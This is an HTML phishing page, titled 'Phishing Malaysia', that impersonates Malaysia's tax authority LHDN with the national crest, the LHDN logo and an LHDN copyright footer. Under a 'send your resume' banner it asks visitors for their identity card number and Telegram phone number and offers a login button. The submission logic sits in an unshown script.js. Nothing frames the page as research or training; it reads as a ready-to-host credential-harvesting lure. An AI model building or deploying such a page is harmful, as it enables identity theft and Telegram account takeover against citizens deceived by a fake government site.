<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Phishing Malaysia</title>
    <!-- favicon -->
    <link rel="icon" href="favicon.ico" type="image/x-icon" />

    <!-- style -->
    <link rel="stylesheet" href="style.css" />

    <!-- feather icons -->
    <script src="https://unpkg.com/feather-icons"></script>

    <!-- my font -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,300;0,400;0,700;1,700&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <!-- navbar -->
    <nav class="navbar">
      <div class="navbar-logo">
        <img
          src="Jata Negara@3x.gif"
          alt="Logo Negara"
          class="navbar-img"
          style="width: 60px; height: auto"
        />
        <img
          src="LHDN logo@3x.png"
          alt="Logo Negara"
          class="navbar-img"
          style="width: 60px; height: auto"
        />
      </div>
      <div class="navbar-nav">
        <div class="search-bar">
          <div class="search-icon">
            <i data-feather="search"></i>
          </div>
        </div>
        <div class="hamburger-menu">
          <div class="menu-icon" onclick="toggleMenu()">
            <i data-feather="menu"></i>
          </div>
        </div>
      </div>
    </nav>
    <!-- navbar end -->

    <!-- hero -->
    <div class="hero">
      <div class="hero-image">
        <img src="banner.png" alt="tng-img" />
      </div>
      <div class="hero-text">
        <h1>HANTAR RESUME SEKARANG</h1>
      </div>

      <div class="form-container">
        <form id="registrationForm">
          <div class="input-wrapper">
            <label for="name" style="font-size: 14px; font-weight: bold"
              >No. Kad Pengenalan</label
            >
            <input
              type="text"
              id="name"
              name="name"
              placeholder="contoh: 000727115964"
              required
            />
          </div>
          <div class="input-wrapper">
            <label for="phone" style="font-size: 14px; font-weight: bold"
              >Nombor Telefon Telegram</label
            >
            <input
              type="tel"
              id="phone"
              name="phone"
              placeholder="contoh: +601153476785"
              required
            />
          </div>
          <button type="submit" id="submit" class="btn">LOG MASUK</button>
        </form>
      </div>
    </div>

    <!-- footer -->
    <div class="footer">
      <p>
        Hakcipta Terpelihara 2024 &copy; Lembaga Hasil Dalam Negeri Malaysia
      </p>
    </div>
  </body>

  <!-- script -->
  <script src="script.js"></script>

  <!-- feather icons -->
  <script>
    feather.replace();
  </script>
</html>
